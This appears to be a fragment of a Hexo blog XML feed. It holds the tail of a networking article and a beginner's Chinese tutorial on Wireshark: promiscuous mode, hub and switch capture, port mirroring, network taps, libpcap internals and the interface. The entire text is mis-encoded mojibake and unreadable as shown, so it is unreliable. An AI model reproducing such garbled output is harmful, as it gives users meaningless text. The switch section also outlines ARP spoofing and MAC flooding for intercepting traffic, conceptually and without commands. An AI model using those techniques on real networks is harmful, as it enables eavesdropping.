é€‰è·¯</p><p>æœ¬æ–‡åŸºæœ¬å®Œç»“ï¼Œè·¯ç”±é€‰æ‹©åŠæ€»ç»“è¿˜å¾…å®Œå–„ã€‚</p><p>å‚è€ƒèµ„æ–™ï¼š</p><p><ahref="https://blog.csdn.net/weixin_39731083/article/details/81637581">è®¡ç®—æœºä¸­çš„å†²çªåŸŸã€å¹¿æ’­åŸŸ</a><ahref="https://blog.csdn.net/GAMEloft9/article/details/25075039">ä¸ºä»€ä¹ˆäº¤æ¢æœºéš”ç¦»å†²çªåŸŸï¼Œä¸éš”ç¦»å¹¿æ’­åŸŸ</a><ahref="https://blog.csdn.net/zyboy2000/article/details/50528253">è·¯ç”±è¡¨è¯¦è§£</a><a href="https://blog.51cto.com/13401027/1975059">è·¯ç”±å™¨çš„å·¥ä½œåŸç†</a><ahref="https://www.cnblogs.com/hoojjack/p/6747357.html">äº¤æ¢æœºå·¥ä½œåŸç†ã€MACåœ°å€è¡¨ã€è·¯ç”±å™¨å·¥ä½œåŸç†è¯¦è§£</a> <ahref="https://baike.baidu.com/item/ç½‘å…³">ç½‘å…³</a> <ahref="https://zhuanlan.zhihu.com/p/31764348">è·¯ç”±å™¨çš„å·¥ä½œåŸç†</a> <ahref="https://blog.csdn.net/qq_35580883/article/details/78879848#">è·¯ç”±å™¨ä¸äº¤æ¢æœºçš„åŸºæœ¬å·¥ä½œåŸç†</a></p>]]></content>
      
      
      <categories>
          
          <category> network </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€. Wiresharkåˆè¯†</title>
      <link href="/blog/2019/07/01/wireshark/beginning_with_wireshark/"/>
      <url>/blog/2019/07/01/wireshark/beginning_with_wireshark/</url>
      
        <content type="html"><![CDATA[<h1 id="ç®€ä»‹">ç®€ä»‹</h1><p>Wiresharkæ˜¯ç›®å‰å…¨çƒä½¿ç”¨æœ€å¹¿æ³›çš„å¼€æºæŠ“åŒ…è½¯ä»¶(å…¨å¹³å°æ”¯æŒ)ï¼Œç”¨äºç½‘ç»œåˆ†æã€‚ç±»ä¼¼æŠ“åŒ…è½¯ä»¶ï¼šFiddlerã€Burp Suiteã€Snifferã€Omnipeekã€Httpwatch å›½å†…ç±»ä¼¼ WireSharkçš„æœ‰<a href="http://www.colasoft.com.cn/">ç§‘æ¥ç½‘ç»œåˆ†æç³»ç»Ÿ</a></p><p>ç›¸å…³å­¦ä¹ ç½‘å€ï¼š <ahref="https://www.wireshark.org/docs/">å®˜æ–¹æ–‡æ¡£</a>ã€ <ahref="https://www.chappell-university.com/books">ä¹¦ç±</a>ã€ <ahref="wiki.wireshark.org">ç»´åŸº</a>ã€<ahref="https://ask.wireshark.org/questions/">å®˜æ–¹è®ºå›</a>ã€<ahref="http://www.tcpdump.org/manpages/pcap-filter.7.html">æ•è·è¿‡æ»¤å™¨</a>ã€<ahref="https://wiki.wireshark.org/CaptureFilters">æ•è·è¿‡æ»¤å™¨è¯­æ³•wiki</a>ã€<ahref="https://www.wireshark.org/docs/dfref/">æ˜¾ç¤ºè¿‡æ»¤å™¨è¯­æ³•</a>ã€<ahref="https://wiki.wireshark.org/DisplayFilters">æ˜¾ç¤ºè¿‡æ»¤å™¨è¯­æ³•wiki</a>ï¼Œ<a href="https://wiki.wireshark.org/SampleCaptures">å®˜ç½‘ wikiå„ç§åè®®çš„ä¾‹å­</a>(åé¢åˆ†æåè®®ï¼Œå¦‚æœä½ è‡ªå·±æŠ“ä¸åˆ°æˆ–æ‡’å¾—æŠ“ï¼Œå¯ä»¥å»è¿™é‡Œä¸‹è½½)</p><h1 id="æŠ“åŒ…åŸç†">æŠ“åŒ…åŸç†</h1><h2 id="ä¸€.-ç½‘ç»œåŸç†">ä¸€. ç½‘ç»œåŸç†</h2><h3 id="æœ¬æœºç¯å¢ƒ">1. æœ¬æœºç¯å¢ƒ</h3><h4 id="ç½‘å¡çš„æ··æ‚æ¨¡å¼">ç½‘å¡çš„æ··æ‚æ¨¡å¼</h4><ol type="1"><li><p>æ˜¯ä¸€ç§å…è®¸ç½‘å¡èƒ½å¤ŸæŸ¥çœ‹åˆ°æ‰€æœ‰æµç»ç½‘ç»œçº¿è·¯æ•°æ®åŒ…çš„é©±åŠ¨æ¨¡å¼ã€‚</p></li><li><p>éæ··æ‚æ¨¡å¼ç½‘å¡ï¼Œæ”¶åˆ°ç›®çš„ MACä¸æ˜¯è‡ªå·±çš„å¸§ï¼Œä¸ä¼šå‘ä¸Šä¼ é€ï¼Œä¼šç›´æ¥ä¸¢å¼ƒã€‚</p></li><li><p>æ··æ‚æ¨¡å¼çš„ç½‘å¡ï¼Œä¼šæŠŠæ‰€æœ‰æ”¶åˆ°çš„æ•°æ®åŒ…æ¥æ”¶ï¼Œå‘ä¸Šä¼ é€ï¼Œä»è€Œå¯ä»¥è¢«æ•°æ®åŒ…å—…æ¢å™¨æ•è·å¹¶è¿›è¡Œåˆ†æã€‚</p></li><li><p>ç°åœ¨å¤§å¤šæ•°ç½‘å¡ä¸€èˆ¬éƒ½æ”¯æŒæ··æ‚æ¨¡å¼</p></li><li><p>Wiresharkè½¯ä»¶è‡ªå¸¦æ··æ‚æ¨¡å¼é©±åŠ¨ï¼Œå¯ä»¥ç›´æ¥æŠŠç½‘å¡åˆ‡æ¢æˆæ··æ‚æ¨¡å¼</p></li><li><p>å¯¹äºä¸€ä¸ªæœªé…ç½®æ··æ‚æ¨¡å¼çš„ç½‘å¡ï¼Œå‡è®¾ PC1 é€šè¿‡äº¤æ¢æœºä¸ PC2ç›¸è¿ï¼Œ</p><p>å¯¹äº PC1 æ¥è¯´ï¼Œå®ƒå¯ä»¥æ¥æ”¶ä¸‰ç§æµé‡ï¼šç›®çš„ MACä¸ºè‡ªå·±ï¼Œå¹¿æ’­ä»¥åŠç»„æ’­</p></li></ol><p>æœ¬å®¶ç¯å¢ƒå¯ä»¥ä½¿ç”¨ç½‘å¡çš„æ··æ‚æ¨¡å¼è¿›è¡ŒæŠ“å–ï¼Œç›®å‰æ‰€æœ‰ PCçš„ç½‘å¡éƒ½æ”¯æŒæ··æ‚æ¨¡å¼ï¼Œï¼ˆä½†æ˜¯è¦æœ‰é©±åŠ¨çš„ï¼‰ï¼Œå¦‚æœä¸€ä¸ªç½‘å¡æ²¡æœ‰é…ç½®æ··æ‚æ¨¡å¼ï¼Œå¯ä»¥æ”¶åˆ°çš„æµé‡ç±»å‹ï¼š</p><p>ç›´æ¥æŠ“åŒ…ï¼ŒæŠ“æœ¬æœºç½‘å¡çš„æµé‡ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œåœ¨æœ¬æœºå®‰è£…Wiresharkï¼Œç»‘å®šç½‘å¡ï¼Œä¸éœ€è¦å€ŸåŠ©äº¤æ¢æœºã€é›†çº¿å™¨ã€è·¯ç”±å™¨ç­‰ç¬¬ä¸‰æ–¹è®¾å¤‡ï¼ŒæŠ“å–æœ¬æœºç”µè„‘ç½‘å¡ä¸Šè¿›å‡ºçš„æµé‡ï¼Œè¿™æ˜¯ä¸€ç§æœ€åŸºæœ¬çš„æŠ“åŒ…æ–¹å¼ã€‚</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E5%85%A5%E9%97%A8/host.png" /></p><h3 id="é›†çº¿å™¨ç¯å¢ƒ">2. é›†çº¿å™¨ç¯å¢ƒ</h3><p>åŒä¸€ä¸ªé›†çº¿å™¨çš„ä¼—å¤šç«¯å£ä¸‹çš„æœºå™¨å¤„äºåŒä¸€å†²çªåŸŸï¼Œå¦‚æœä¸å¤„äºé›†çº¿å™¨ç¯å¢ƒï¼Œå¯ä»¥ä½¿ç”¨é›†çº¿å™¨æ¥å‡ºçš„æ–¹å¼æŠ“åŒ…ï¼Œå¦‚æœå¤„äºé›†çº¿å™¨ç¯å¢ƒï¼Œå³ï¼šå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œä¸‰å°ç”µè„‘PC1ã€PC2ã€PC3 é€šä¿¡ï¼ŒPC1 è£…æœ‰Wiresharkï¼Œä¸‰å°ç”µè„‘è¿æ¥åˆ°åŒä¸€å°é›†çº¿å™¨ï¼Œé›†çº¿å™¨å±äºç‰©ç†å±‚äº§å“ï¼ŒæŒç®¡ç‰©ç†æ¯”ç‰¹ä¼ è¾“ï¼Œçœ‹ä¸æ‡‚MAC åœ°å€å’Œ IP åœ°å€ï¼Œå› æ­¤ä¸‰å°ç”µè„‘å¤„äºåŒä¸€ä¸ªå†²çªåŸŸï¼Œå³è¿™ä¸‰å°æœºå™¨å‡å¤„äº</p><p>å¯è§†èŒƒå›´:åœ¨æ•°æ®æŠ¥å—…æ¢å™¨ä¸­èƒ½å¤Ÿçœ‹åˆ°é€šä¿¡æµé‡çš„ä¸»æœºèŒƒå›´ï¼Œä¹Ÿå¯ä»¥è¯´æ˜¯ä¸€ä¸ªå†²çªåŸŸ</p><p>ä¸€å°ç”µè„‘å¯ä»¥æŠ“åˆ°åŒä¸€é›†çº¿å™¨ä¸‹å…¶ä»–ç”µè„‘å‘é€è¿‡æ¥çš„æ•°æ®åŒ…ï¼Œè¿™æ˜¯ä¸€ç§æ¯”è¾ƒå…¸å‹çš„è¢«æ·˜æ±°çš„è€ç½‘ç»œæ‹“æ‰‘ç»“æ„ã€‚</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E5%85%A5%E9%97%A8/hub.png" /></p><h3 id="äº¤æ¢æœºç¯å¢ƒ">3. äº¤æ¢æœºç¯å¢ƒ</h3><p>äº¤æ¢æœºç¯å¢ƒä¸‹çš„å¯è§†èŒƒå›´ï¼ˆå†²çªåŸŸï¼‰ä»…é™äºä½ æ‰€æ¥å…¥çš„ç«¯å£ï¼Œä¸Šä¸€ç¯‡æ–‡ç« ä¸­å·²ç»è®²è¿‡äº¤æ¢æœºä¼šéš”ç¦»å†²çªåŸŸï¼Œ</p><h4 id="ç«¯å£é•œåƒport-mirroring">1) ç«¯å£é•œåƒï¼ˆPort mirroringï¼‰</h4><p>PC2 ä¸ PC3 é€šä¿¡ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼ˆMAC åœ°å€è¡¨ä¸­æœ‰å¯¹åº”çš„ MAC è¡¨é¡¹ï¼‰ï¼ŒPC1æ— æ³•æŠ“åˆ°äºŒè€…ä¹‹é—´çš„æ•°æ®åŒ…ã€‚ï¼ˆéä¸€èˆ¬ï¼Œå³ï¼šæ²¡å¯¹åº” MACè¡¨é¡¹æ—¶ï¼Œå¯ä»¥æŠ“åˆ°ï¼‰ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œå¯ä»¥åœ¨äº¤æ¢æœºåšç«¯å£ç­–ç•¥ï¼ˆSPAN/SPANï¼‰ã€‚</p><p>SPAN æŠ€æœ¯å¤§ä½“åˆ†ä¸ºä¸¤ç§ç±»å‹ï¼Œæœ¬åœ° SPAN å’Œè¿œç¨‹ SPAN. ----Local SwitchedPort Analyzer (SPAN) and Remote SPAN (RSPAN)ï¼Œå®ç°æ–¹æ³•ä¸Šç¨æœ‰ä¸åŒã€‚ åˆ©ç”¨SPANæŠ€æœ¯æˆ‘ä»¬å¯ä»¥æŠŠäº¤æ¢æœºä¸ŠæŸäº›æƒ³è¦è¢«ç›‘æ§ç«¯å£ï¼ˆä»¥ä¸‹ç®€ç§°å—æ§ç«¯å£ï¼‰çš„æ•°æ®æµCOPY æˆ– MIRROR ä¸€ ä»½ï¼Œå‘é€ç»™è¿æ¥åœ¨ç›‘æ§ç«¯å£ä¸Šçš„æµé‡åˆ†æä»ªï¼ˆå¹¶ä¸ä¼šå½±å“<ahref="https://baike.baidu.com/item/æºç«¯å£">æºç«¯å£</a>çš„æ•°æ®äº¤æ¢ï¼‰ï¼Œæ¯”å¦‚CISCO çš„ IDS æˆ–æ˜¯è£…äº† SNIFFER å·¥å…·çš„ PC. å—æ§ç«¯å£å’Œç›‘æ§ç«¯å£å¯ä»¥åœ¨åŒä¸€å°äº¤æ¢æœºä¸Šï¼ˆæœ¬åœ° SPANï¼‰ï¼Œä¹Ÿå¯ä»¥åœ¨ä¸åŒçš„äº¤æ¢æœºä¸Šï¼ˆè¿œç¨‹SPANï¼‰ã€‚è¯¥åŠŸèƒ½å¾€å¾€è¢«ç”¨æ¥å®ç°æ•…éšœå®šä½ã€æµé‡åˆ†æã€æµé‡å¤‡ä»½ç­‰ã€‚</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E5%85%A5%E9%97%A8/port%20mapping.png" /></p><h4 id="ç½‘ç»œåˆ†æµå™¨">2) ç½‘ç»œåˆ†æµå™¨</h4><p>ç½‘ç»œåˆ†æµå™¨æ˜¯ä¸€ç§ä¸“é—¨ä¸ºäº†ç½‘ç»œåˆ†æè€Œè®¾è®¡çš„ç‰¹æ®Šç¡¬ä»¶ï¼Œé€šå¸¸ç”¨äºç½‘ç»œå…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼ˆIDSï¼‰ã€‚å®ƒæ˜¯ä¸€ä¸ªç‹¬ç«‹çš„ç¡¬ä»¶ï¼Œå®ƒä¸ä¼šå¯¹å·²æœ‰ç½‘ç»œè®¾å¤‡çš„è´Ÿè½½å¸¦æ¥ä»»ä½•å½±å“ï¼Œè¿™ä¸ç«¯å£é•œåƒç­‰æ–¹å¼ç›¸æ¯”å…·æœ‰æå¤§çš„ä¼˜åŠ¿ã€‚</p><p>å®ƒæ˜¯ä¸€ç§åœ¨çº¿ï¼ˆin-lineï¼‰çš„è®¾å¤‡ï¼Œç®€å•ä¸€ç‚¹è¯´å°±æ˜¯å®ƒéœ€è¦ä¸²æ¥åˆ°ç½‘ç»œä¸­ã€‚</p><h4 id="arp-æ¬ºéª—arp-spoofing">3) ARP æ¬ºéª—ï¼ˆARP spoofingï¼‰</h4><p>æ˜¯ä¸€ç§åœ¨äº¤æ¢å¼ç½‘ç»œä¸­è¿›è¡Œç›‘å¬çš„é«˜çº§æŠ€æœ¯ï¼Œä¸€èˆ¬éœ€è¦å€ŸåŠ©ç¬¬ä¸‰æ–¹å·¥å…·è½¯ä»¶æ¥ä¸€èµ·å®Œæˆï¼ˆCain&amp;abelå·¥å…·è½¯ä»¶ï¼‰</p><p>1ï¼‰ PC2 æ”¶åˆ°å«æœ‰ PC3 çš„æ•°æ®æŠ¥ï¼Œä½†æ˜¯ä¸çŸ¥é“å…¶ MAC åœ°å€ï¼Œä¾¿é€šè¿‡ ARPåè®®è¿›è¡Œå¹¿æ’­ã€‚</p><p>2ï¼‰æ­¤æ—¶ PC1 åš ARP æ¬ºéª—ï¼Œä¸æ–­åœ°å‘ PC2 å›å¤ï¼šæˆ‘æ˜¯ PC3ï¼Œå¯¹åº”çš„ MAC æ˜¯XXXï¼Œå°±å¯ä»¥æ¯’åŒ– PC2 çš„ ARP è¡¨ï¼ˆARP ç¼“å­˜è¡¨åŸºäº"ååˆ°ä¼˜å…ˆ"åŸåˆ™ï¼ŒIP ä¸ MACçš„æ˜ å°„ä¿¡æ¯èƒ½è¢«è¦†ç›–ï¼‰ï¼Œè¿™æ ·ï¼ŒPC2 çš„ ARP è¡¨ä¸Šä¾¿å°†è¡¨é¡¹ä¸Š PC3 çš„ MACåœ°å€å¤„å¯¹åº”æˆäº† PC2 çš„ MAC åœ°å€ã€‚</p><p>3ï¼‰ä»æ­¤æ—¶åˆ°è¯¥é”™è¯¯è¡¨é¡¹è¢«æ›´æ–°æ­£ç¡®ä¹‹å‰ï¼ŒPC2 æƒ³ä¸ PC3 é€šä¿¡ï¼Œå°±è¦ç»è¿‡PC1ï¼Œå†ç”± PC1 å†³å®šæ˜¯å¦å°†æ•°æ®åŒ…å‘ç»™ PC3ã€‚PC2 å’Œ PC3 çš„é€šä¿¡æ•°æ®æµè¢« PC1æ‹¦æˆªï¼Œå½¢æˆäº†å…¸å‹çš„"<strong>ä¸­é—´äººæ”»å‡»</strong>"ã€‚</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E5%85%A5%E9%97%A8/arp_spoofing.png" /></p><h4 id="mac-æ³›æ´ªmac-flooding">4) MAC æ³›æ´ªï¼ˆMAC floodingï¼‰</h4><p>MACæ³›æ´ªå¹¶ä¸æ˜¯é’ˆå¯¹ç½‘ç»œä¸­ä»»ä½•ä¸»æœºçš„æ”»å‡»æ–¹å¼ï¼Œè€Œæ˜¯ä¸€ç§é’ˆå¯¹å…¶ä¸­äº¤æ¢æœºçš„æ”»å‡»æ–¹å¼ã€‚ä½†æ˜¯ï¼Œå—å®³çš„æ˜¯ç½‘ç»œä¸­çš„ä¸»æœºã€‚</p><p>åŸç†ï¼šæ”»å‡»è€…å‘é€å¤§é‡çš„å…·æœ‰ä¸åŒåœ°å€çš„åƒåœ¾ä»¥å¤ªç½‘å¸§ï¼Œæ¥æ¶ˆè€—äº¤æ¢æœºç”¨æ¥å­˜å‚¨MAC è¡¨çš„å†…å­˜ï¼Œç›´åˆ°æ­£ç¡®åˆæ³•çš„ MAC è¡¨é¡¹è¢«éæ³•çš„åƒåœ¾ä»¥å¤ªç½‘å¸§å¯¹åº”çš„ MACè¡¨é¡¹æŒ¤å‡º MACè¡¨ï¼Œè¿™æ ·äº¤æ¢æœºå°±ä¸èƒ½å°†åˆ°æ¥çš„æ•°æ®è½¬å‘åˆ°æŒ‡å®šçš„ç«¯å£ï¼ˆå³ï¼šè¿˜è¦ä½¿ç”¨ ARPåè®®ï¼Œå°†åˆ°æ¥çš„æ•°æ®åŒ…è¿›è¡Œå¹¿æ’­ï¼Œå³ï¼šåˆ°æ¥çš„æ•°æ®è¢«å‘é€åˆ°æ‰€æœ‰ç«¯å£ï¼Œä¹Ÿå°±æ˜¯æ³›æ´ªï¼‰ï¼Œè¿™æ ·æ”»å‡»è€…å°±å®ç°æµé‡åŠ«æŒäº†</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E5%85%A5%E9%97%A8/mac_flooding.png" /></p><p>ä½¿ç”¨ç½‘ç»œåˆ†æµå™¨</p><p>å°ç»“ï¼šäº¤æ¢æœºç¯å¢ƒçš„è¿™ä¸‰ç§æ–¹å¼ï¼Œç¬¬ä¸€ç§å¯ä»¥è¯´æ˜¯ç»´æŠ¤å®‰å…¨çš„åšæ³•ï¼Œåä¸¤ç§ç®—æ˜¯é»‘å®¢æ”»å‡»å§ã€‚</p><h2 id="äºŒ.-åº•å±‚åŸç†">äºŒ. åº•å±‚åŸç†</h2><p>é¦–å…ˆï¼Œæˆ‘ä»¬ç®€å•äº†è§£ä¸€ä¸‹ç½‘ç»œå—…æ¢å™¨çš„å·¥ä½œåŸç†</p><ol type="1"><li><p>æ”¶é›†</p><p>æ•°æ®åŒ…å—…æ¢å™¨ä»ç½‘ç»œçº¿ç¼†ä¸Šæ”¶é›†åŸå§‹äºŒè¿›åˆ¶æ•°æ®ã€‚<em>é€šå¸¸æƒ…å†µä¸‹ï¼Œé€šè¿‡å°†é€‰å®šçš„ç½‘å¡è®¾ç½®æˆæ··æ‚æ¨¡å¼æ¥å®ŒæˆæŠ“åŒ…ã€‚åœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼Œç½‘å¡å°†æŠ“å–ä¸€ä¸ªç½‘æ®µä¸Šæ‰€æœ‰çš„ç½‘ç»œé€šä¿¡æµé‡ï¼Œè€Œä¸ä»…æ˜¯å‘å¾€å®ƒçš„æ•°æ®åŒ…ã€‚</em></p></li><li><p>è½¬æ¢</p><p>å°†æ•è·çš„äºŒè¿›åˆ¶æ•°æ®è½¬æ¢æˆå¯è¯»å½¢å¼ã€‚é«˜çº§çš„å‘½ä»¤è¡Œæ•°æ®åŒ…å—…æ¢å™¨å°±æ”¯æŒåˆ°è¿™ä¸€æ­¥éª¤ã€‚åˆ°è¿™æ­¥ï¼Œç½‘ç»œä¸Šçš„æ•°æ®åŒ…å°†ä»¥ä¸€ç§éå¸¸åŸºç¡€çš„è§£ææ–¹å¼è¿›è¡Œæ˜¾ç¤ºï¼Œè€Œå°†å¤§éƒ¨åˆ†çš„åˆ†æå·¥ä½œç•™ç»™æœ€ç»ˆç”¨æˆ·ã€‚</p></li><li><p>åˆ†æ</p><p>å¯¹æ•è·å’Œè½¬æ¢åçš„æ•°æ®è¿›è¡ŒçœŸæ­£çš„æ·±å…¥åˆ†æã€‚æ•°æ®åŒ…å—…æ¢å™¨ä»¥æ•è·çš„ç½‘ç»œæ•°æ®ä½œä¸ºè¾“å…¥ï¼Œè¯†åˆ«å’ŒéªŒè¯å®ƒä»¬çš„åè®®ï¼Œç„¶åå¼€å§‹åˆ†ææ¯ä¸ªåè®®ç‰¹å®šçš„å±æ€§ã€‚</p></li></ol><p>ä¸‹é¢æˆ‘ä»¬ä»‹ç»ä¸€ä¸‹ Wireshark çš„åŸç†</p><p>é¦–å…ˆï¼Œæ•°æ®æµåŠ¨æ–¹å‘ï¼šç½‘å¡ï¼ˆæ¥æ”¶ï¼‰ -&gt; CPU (å¤„ç†)-&gt;Wiresharkã€‚</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E5%85%A5%E9%97%A8/principle.png" /></p><ol type="1"><li>libpcapï¼ˆPacket Capture Libraryï¼‰æ•°æ®åŒ…æ•è·å‡½æ•°åº“ï¼Œæ˜¯ Unix/Linuxå¹³å°ä¸‹çš„ç½‘ç»œæ•°æ®åŒ…æ•è·å‡½æ•°åº“ï¼ˆå¯¹åº” WinPcap ä¸º Windowä¸‹çš„ï¼‰ã€‚å®ƒæ˜¯ä¸€ä¸ªç‹¬ç«‹äºç³»ç»Ÿçš„ç”¨æˆ·å±‚åŒ…æ•è·çš„ APIæ¥å£ï¼Œä¸ºåº•å±‚ç½‘ç»œç›‘æµ‹æä¾›äº†ä¸€ä¸ªå¯ç§»æ¤çš„æ¡†æ¶ã€‚</li><li>Capture ä¸ºæŠ“åŒ…å¼•æ“ï¼Œåˆ©ç”¨ libPcap / WinPcapä»åº•å±‚æŠ“å–ç½‘ç»œæ•°æ®åŒ…ï¼ŒlibPcap / WinPcapæä¾›äº†é€šç”¨çš„æŠ“åŒ…æ¥å£ï¼Œèƒ½ä»ä¸åŒç±»å‹çš„ç½‘ç»œæ¥å£æŠ“å–ã€‚</li><li>Wiretap æä¾›æ ¼å¼æ”¯æŒï¼Œä»æŠ“åŒ…æ–‡ä»¶ä¸­è¯»å–æ•°æ®æŠ¥ï¼Œæ”¯æŒå¤šç§æ ¼å¼ã€‚</li><li>Coreæ˜¯æ ¸å¿ƒå¼•æ“ï¼Œé€šè¿‡å‡½æ•°è°ƒç”¨å°†å…¶ä»–æ¨¡å—è¿æ¥åœ¨ä¸€èµ·ï¼Œèµ·åˆ°è”åŠ¨è°ƒåº¦çš„ä½œç”¨</li><li>GTK1/2 ä¸ºå›¾åƒå¤„ç†å·¥å…·ï¼Œå¤„ç†ç”¨æˆ·çš„è¾“å…¥è¾“å‡ºæ˜¾ç¤º</li></ol><h1 id="ç•Œé¢åŠåŠŸèƒ½ç®€ä»‹">ç•Œé¢åŠåŠŸèƒ½ç®€ä»‹</h1><h2 id="ç•Œé¢ä»‹ç»">ç•Œé¢ä»‹ç»</h2><p>å®‰è£…å°±ä¸è¯´äº†ï¼Œä¸€è·¯é»˜è®¤ä¸‹ä¸€æ­¥å°±è¡Œäº†ã€‚åšä¸»ç”¨çš„æ˜¯ Windows ä¸Šæœ€æ–°ç‰ˆ3.0.2ï¼Œæ‰“å¼€è½¯ä»¶ï¼Œé¦–å…ˆé€‰æ‹©ä¸€ä¸ªæŠ“åŒ…çš„åœ°å€ï¼ˆå¥½åƒæ˜¯è¿™ä¹ˆè¯´ â˜ºï¸ï¼‰ï¼Œæˆ‘è¿™é‡Œæ˜¯WiFi ä¸Šç½‘ï¼Œé€‰æ‹© WLANå·¦é”®è¿ç»­ç‚¹å‡»ä¸¤ä¸‹ï¼Œè¿›å…¥æŠ“åŒ…ä¸»ç•Œé¢ï¼Œä¸å¤šè¯´äº†ï¼Œä¸€å›¾èƒœåƒè¨€ã€‚</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/å…¥é—¨/region.png" />ç®€è¦ä»‹ç»ä¸€ä¸‹é‡è¦çš„åŒºåŸŸå—å§ï¼Œè¿™é‡Œè¯´ä¸€ä¸‹ï¼Œæ„Ÿè§‰è¦æŠŠ Wiresharkç©ç²¾ï¼Œè¿‡æ»¤å™¨å’Œç»Ÿè®¡æ˜¯å¿…é¡»è¦å¥½å¥½æŒæ¡çš„ã€‚</p><h3 id="å…¶ä»–">å…¶ä»–</h3><p>ç³»ç»Ÿé…ç½®ä¸ºèœå•æ  -&gt; ç¼–è¾‘ -&gt;é¦–é€‰é¡¹ã€‚é¦–é€‰é¡¹å¯ä»¥è°ƒæ•´ä¸»ç•Œé¢çš„å¸ƒå±€ï¼Œä¸åŒåè®®åŒ…çš„é…è‰²ï¼Œæ–‡ä»¶ï¼Œè¿‡æ»¤ç­‰å„ç§è®¾ç½®ã€‚</p><p>Appearance(å¤–è§‚)ï¼šè¿™äº›é€‰é¡¹å†³å®šäº† Wiresharkåˆ—çš„æ˜¾ç¤ºæ•°æ®ä»¥åŠæ˜¯å¦æ˜¾ç¤ºæŸåˆ—ã€æ˜¾ç¤ºæ•è·æ•°æ®çš„å­—ä½“å’Œç‰¹æ®Šæƒ…å†µçš„é¢œè‰²ä»¥åŠå‰æ™¯ä¸»çª—å£çš„å¸ƒå±€ã€‚å¯ä»¥å¢åŠ åˆ—ï¼Œæ¯”å¦‚å¢åŠ ä¸€åˆ—ç”¨æ¥æ˜¾ç¤ºTCP çª—å£å¤§å°ï¼štcp.window_size æˆ–æ˜¾ç¤º TTLï¼šip.ttlCaptureï¼ˆæ•è·ï¼‰ï¼šå¯¹æ•è·æ•°æ®åŒ…çš„æ–¹å¼è¿›è¡Œç‰¹æ®Šè®¾ç½®ï¼Œæ¯”å¦‚é»˜è®¤ä½¿ç”¨çš„è®¾å¤‡ã€æ˜¯å¦é»˜è®¤ä½¿ç”¨æ··æ‚æ¨¡å¼ã€æ˜¯å¦å®æ—¶æ›´æ–°Pack List é¢æ¿ç­‰ã€‚ Expertï¼ˆä¸“å®¶æ¨¡å¼ï¼‰ï¼š NameResolutionsï¼ˆåå­—è§£æï¼‰ï¼šè¿™äº›è®¾å®šå¯ä»¥å¼€å¯ Wiresharkå°†åœ°å€ï¼ˆMACã€ç½‘ç»œä»¥åŠä¼ è¾“åå­—è§£æï¼‰è§£ææˆæ›´åŠ å®¹æ˜“è¾¨åˆ«çš„åå­—è¿™ä¸€åŠŸèƒ½ã€‚FilterButtonï¼ˆè¿‡æ»¤æŒ‰é’®ï¼‰ï¼šå¯ä»¥åšè¿‡æ»¤çš„æ ‡ç­¾ï¼Œåœ¨è¿‡æ»¤çš„æ—¶å€™ç›´æ¥ä½¿ç”¨æ­¤æ ‡ç­¾ã€‚Protocolsï¼ˆåè®®ï¼‰ï¼šåˆ—å‡ºéƒ¨åˆ†èƒ½å¤Ÿè¢«è§£ç çš„æ‰€æœ‰æ•°æ®åŒ…ï¼Œè¿™éƒ¨åˆ†åè®®çš„é€‰é¡¹å¯ä»¥è¢«æ›´æ”¹ï¼Œé™¤éæœ‰ç‰¹æ®Šçš„åŸå› ï¼Œå¦åˆ™ä¸è¦å»ä¿®æ”¹è¿™äº›åè®®é€‰é¡¹ï¼Œä¿æŒé»˜è®¤å€¼å°±å¥½ã€‚Statisticsï¼ˆç»Ÿè®¡ï¼‰ï¼šæä¾›äº† Wireshark ç»Ÿè®¡åŠŸèƒ½çš„è®¾å®šé€‰é¡¹ã€‚è§†å›¾ä¸­å¯ä»¥è°ƒæ•´ç•Œé¢çš„æ˜¾ç¤ºçš„åŒºå—ï¼Œä¹Ÿå¯ä»¥åœ¨â€œç€è‰²è§„åˆ™â€ä¸‹æŸ¥çœ‹/è°ƒæ•´ä¸åŒåè®®åŠç‰¹æ®Šæ•°æ®çš„é…è‰²æ–¹æ¡ˆã€‚è·³è½¬ä¸­æ˜¯ä¸€äº›å¿«æ·é”®ï¼Œå¸¸ç”¨çš„è®°ä½ä¼šç”¨å°±å¥½ï¼Œè®°ä¸ä½ä¹Ÿæ²¡å…³ç³»ã€‚æ•°æ®æŠ¥åˆ—è¡¨çš„è¡¨é¡¹ï¼Œåœ¨ä¸Šé¢å³é”®ï¼Œå¯ä»¥è‡ªå·±è°ƒæ•´å’Œä¿®æ”¹ï¼Œä¸€èˆ¬é»˜è®¤ï¼Œå¦‚æœè¦æŸ¥çœ‹ä¸€äº›è¯¦ç»†çš„ä¿¡æ¯ï¼Œæ¯”å¦‚TTL ç­‰å¯ä»¥åŠ åˆ°åˆ—è¡¨ä¸Šå»å·¥å…·æ çš„è¯ï¼ŒæŠŠé¼ æ ‡ç®­å¤´ç§»åˆ°æŸä¸ªå›¾æ ‡ä¸Šä¼šæ˜¾ç¤ºæè¿°åŠŸèƒ½çš„æ–‡å­— PacketListï¼ˆæ•°æ®åŒ…åˆ—è¡¨åŒºï¼‰ï¼šæ˜¾ç¤ºå½“å‰æ•è·çš„æ‰€æœ‰æ•°æ®åŒ…ï¼Œå…¶ä¸­åŒ…æ‹¬æ•°æ®åŒ…åºå·ã€æ•è·ç›¸å¯¹æ—¶é—´ã€æºç›®æ ‡åœ°å€ã€åè®®ã€æ¦‚å†µä¿¡æ¯ç­‰ã€‚ 